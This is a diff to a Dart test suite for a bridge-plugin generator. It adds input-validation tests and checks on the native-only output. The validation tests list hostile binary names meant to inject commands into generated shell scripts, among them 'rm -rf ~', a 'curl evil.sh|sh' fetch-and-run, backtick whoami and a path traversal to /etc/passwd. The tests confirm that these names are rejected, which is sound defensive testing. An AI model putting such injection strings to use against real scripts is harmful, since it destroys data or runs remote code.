@@ -3,10 +3,15 @@ import 'dart:io';
 import 'package:binary_sdk_bridge/binary_sdk_bridge.dart';
 import 'package:test/test.dart';
 
-BridgeSpec _spec({String? ios = 'AcmeSDK', String? aar = 'AcmeSDK'}) =>
+BridgeSpec _spec({
+  String? ios = 'AcmeSDK',
+  String? aar = 'AcmeSDK',
+  BridgeFlavor flavor = BridgeFlavor.flutter,
+}) =>
     BridgeSpec(
       pluginName: 'acme_ads',
       organization: 'com.example',
+      flavor: flavor,
       iosFrameworkName: ios,
       androidAarName: aar,
     );
@@ -49,6 +54,78 @@ void main() {
         () => _spec(ios: null, aar: null).validate(),
         throwsA(isA<FormatException>()),
       );
+    });
+  });
+
+  group('input that would break or endanger the generated files', () {
+    void rejects(String why, BridgeSpec Function() build) {
+      test(why, () => expect(build, throwsA(isA<FormatException>())));
+    }
+
+    // Binary names land inside generated SHELL SCRIPTS. A name carrying a
+    // quote or a command substitution would execute when someone runs
+    // tool/fetch_*.sh — this is the one input that must never be trusted.
+    for (final evil in [
+      r'Vendor$(rm -rf ~)',
+      'Vendor";curl evil.sh|sh;"',
+      'Vendor`whoami`',
+      'Vendor SDK',
+      '../../etc/passwd',
+      '-Vendor',
+    ]) {
+      rejects('rejects a dangerous binary name: $evil', () {
+        BridgeSpec(
+          pluginName: 'acme_ads',
+          organization: 'com.example',
+          iosFrameworkName: evil,
+        ).validate();
+        return _spec();
+      });
+    }
+
+    rejects('rejects a deployment target that is not a version', () {
+      BridgeSpec(
+        pluginName: 'acme_ads',
+        organization: 'com.example',
+        iosFrameworkName: 'AcmeSDK',
+        iosDeploymentTarget: 'latest',
+      ).validate();
+      return _spec();
+    });
+
+    rejects('rejects compileSdk below minSdk', () {
+      BridgeSpec(
+        pluginName: 'acme_ads',
+        organization: 'com.example',
+        androidAarName: 'AcmeSDK',
+        androidMinSdk: 34,
+        androidCompileSdk: 21,
+      ).validate();
+      return _spec();
+    });
+
+    rejects('rejects a Java version Gradle does not accept', () {
+      BridgeSpec(
+        pluginName: 'acme_ads',
+        organization: 'com.example',
+        androidAarName: 'AcmeSDK',
+        javaVersion: 13,
+      ).validate();
+      return _spec();
+    });
+
+    test('accepts the binary names real vendors actually ship', () {
+      for (final ok in ['AcmeSDK', 'Acme-SDK', 'Acme_SDK', 'AcmeSDK2', 'a.b']) {
+        expect(
+          () => BridgeSpec(
+            pluginName: 'acme_ads',
+            organization: 'com.example',
+            iosFrameworkName: ok,
+          ).validate(),
+          returnsNormally,
+          reason: '$ok should be allowed',
+        );
+      }
     });
   });
 
@@ -180,6 +257,56 @@ void main() {
       );
       expect(gradle, contains('bundleDebugAar'),
           reason: 'the limitation must be documented in the file itself');
+    });
+  });
+
+  group('the native flavour carries no Flutter', () {
+    List<GeneratedFile> nativeFiles() =>
+        BridgeGenerator(_spec(flavor: BridgeFlavor.native)).plan();
+
+    test('emits no Dart layer at all', () {
+      final paths = nativeFiles().map((f) => f.relativePath);
+      expect(paths, isNot(contains('pubspec.yaml')));
+      expect(paths.where((p) => p.startsWith('lib/')), isEmpty);
+      expect(paths.where((p) => p.startsWith('test/')), isEmpty);
+      expect(paths.where((p) => p.endsWith('Plugin.swift')), isEmpty);
+      expect(paths.where((p) => p.endsWith('Plugin.kt')), isEmpty);
+    });
+
+    test('still emits both native wrappers and the fetch scripts', () {
+      final paths = nativeFiles().map((f) => f.relativePath);
+      expect(paths, contains('ios/acme_ads/Package.swift'));
+      expect(paths, contains('android/build.gradle.kts'));
+      expect(paths.where((p) => p.startsWith('tool/')), hasLength(2));
+    });
+
+    test('Package.swift stays internally consistent', () {
+      // The bug this catches: making the TARGET conditional while leaving the
+      // product and dependency behind produced a manifest referencing a target
+      // that does not exist — a package that cannot resolve at all.
+      final manifest = nativeFiles()
+          .firstWhere((f) => f.relativePath.endsWith('Package.swift'))
+          .contents;
+      expect(manifest, isNot(contains('FlutterFramework')));
+      expect(manifest, isNot(contains('.library(name: "acme-ads"')));
+      expect(manifest, contains('.library(name: "AcmeAdsKit"'));
+      expect(manifest, contains('dependencies: [],'));
+    });
+
+    test('no unrendered template interpolation escapes into any file', () {
+      // Escaping bugs in the templates print `\${spec.foo}` verbatim into the
+      // generated file, which then looks like a working file until someone
+      // reads it.
+      for (final flavor in BridgeFlavor.values) {
+        for (final file in BridgeGenerator(_spec(flavor: flavor)).plan()) {
+          expect(
+            file.contents,
+            isNot(contains(r'${spec.')),
+            reason:
+                '\${file.relativePath} (\${flavor.name}) leaked a template expression',
+          );
+        }
+      }
     });
   });
 
